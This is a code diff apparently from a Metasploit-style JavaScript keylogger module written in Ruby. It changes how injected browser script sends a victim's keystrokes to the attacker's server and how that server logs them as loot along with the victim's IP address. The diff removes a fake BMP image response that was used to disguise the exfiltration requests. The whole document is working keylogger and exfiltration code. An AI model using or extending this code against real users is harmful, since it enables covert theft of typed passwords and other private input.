@@ -94,7 +94,7 @@ function #{@random_text}(k#{@random_text}){
 		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
 	}
 	xmlhttp=new XMLHttpRequest();
-	xmlhttp.open("GET","#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{@random_text}.bmp&[" + l#{@random_text} + "]",true);
+	xmlhttp.open("GET","#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{@random_text}&[" + l#{@random_text} + "]",true);
 	xmlhttp.send();
 }
 EOS
@@ -185,35 +185,6 @@ EOS
 		return ico
 	end
 
-	# Creates a 1x1 empty BMP image to make the requester happy
-	def img
-		# fileheader bmfh
-		"BM"               + # bfType
-		"\x42\x00\x00\x00" + # bfSize
-		"\x00\x00"         + # bfReserved1
-		"\x00\x00"         + # bfReserved2
-		"\x3e\x00\x00\x00" + # bfOffBits
-		# infoheader bmih
-		"\x28\x00\x00\x00" + # biSize
-		"\x01\x00\x00\x00" + # biWidth
-		"\x01\x00\x00\x00" + # biHeight
-		"\x01\x00"         + # biPlanes
-		"\x01\x00"         + # biBitCount
-		"\x00\x00\x00\x00" + # biCompression
-		"\x04\x00\x00\x00" + # biSizeImage
-		"\x00\x00\x00\x00" + # biXpelsPerMeter
-		"\x00\x00\x00\x00" + # biYpelsPerMeter
-		"\x00\x00\x00\x00" + # biClrUsed
-		"\x00\x00\x00\x00" + # biClrImportant
-		# aColors
-		# Blue/Green/Red/Reserved
-		"\x00\x00\x00\x00" + # aColors 0
-		"\xff\xff\xff\x00" + # aColors 1
-		# bitmapline
-		"\x80"             + # imageData
-		"\x00\x00\x00"       # padBytes
-	end
-
 	# This handles reporting to the database
 	def cleanup
 		super
@@ -242,11 +213,10 @@ EOS
 			request_timestamp(cli,request)
 		
 		# JavaScript HTTP Image GET Request is used for sending the keystrokes over network.
-		elsif request.uri =~ /\.bmp/
-			content = img
-			content_type = "image/bmp"
-				send_response(cli, content, {'Content-Type'=> content_type})
-			log = request.uri.split("\.bmp&")[1]
+		elsif request.uri =~ /#{@random_text}/
+			content_type = "text/plain"
+				send_response(cli, @random_text, {'Content-Type'=> content_type})
+			log = request.uri.split("&")[1]
 			hex_to_s(log)
 			@loot <<  "#{cli.peerhost} - #{current_time} - " + @ascii_log + "\r\n"
 			if log.length > 1 
